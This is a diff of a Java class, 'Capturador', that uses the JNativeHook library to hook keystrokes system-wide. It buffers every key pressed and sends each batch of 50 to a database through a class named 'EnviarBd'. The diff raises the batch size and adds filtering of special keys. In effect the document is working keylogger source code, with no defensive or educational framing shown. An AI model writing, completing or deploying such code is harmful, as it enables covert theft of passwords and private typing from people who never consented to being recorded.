@@ -1,40 +1,60 @@
 package tech.leonam;
 
-import org.jnativehook.keyboard.NativeKeyEvent;
-import org.jnativehook.keyboard.NativeKeyListener;
+import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
+import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 import tech.leonam.dao.EnviarBd;
 
 public class Capturador implements NativeKeyListener {
     private String aSerEnviado = "";
-    private String letraPressionada = "";
     private int i = 0;
-    public static final int numeroDeCaracteresASerEnviado = 10;
+    public static final int numeroDeCaracteresASerEnviado = 50;
+
+    public static final String[] ESPECIAIS = {
+            "backspace",
+            "up",
+            "down",
+            "right",
+            "left",
+            "tab",
+            "enter",
+            "esc",
+            "comma",
+            "shift",
+            "quote",
+            "alt",
+            "back",
+            "ctrl",
+            "quoteback"
+    };
 
     @Override
     public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
-        try {
-            try {
-                letraPressionada += NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()).toLowerCase();
-            } catch (Exception ex) {
-                letraPressionada += " ";
-            }
-            aSerEnviado += letraPressionada;
-            i++;
-            if (i >= numeroDeCaracteresASerEnviado) {
-                new EnviarBd(aSerEnviado);
-                i = 0;
-                aSerEnviado = "";
-            }
-        } catch (Exception ignored) {
-        }
-    }
 
-    @Override
+        var letra = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()).toLowerCase();
+
+        for(var daVez:ESPECIAIS){
+            if(daVez.equals(letra)){
+                letra = letra.replace(letra,"_");
+            }
+        }
+
+        if ("space".equals(letra)) {
+            letra = " ";
+        }
+        aSerEnviado += letra;
+
+        i++;
+        System.out.println(aSerEnviado);
+        if(i >= numeroDeCaracteresASerEnviado){
+            new EnviarBd(aSerEnviado);
+            aSerEnviado = " ";
+            i = 0;
+        }
+    } @Override
     public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
     }
 
     @Override
     public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
     }
-
 }
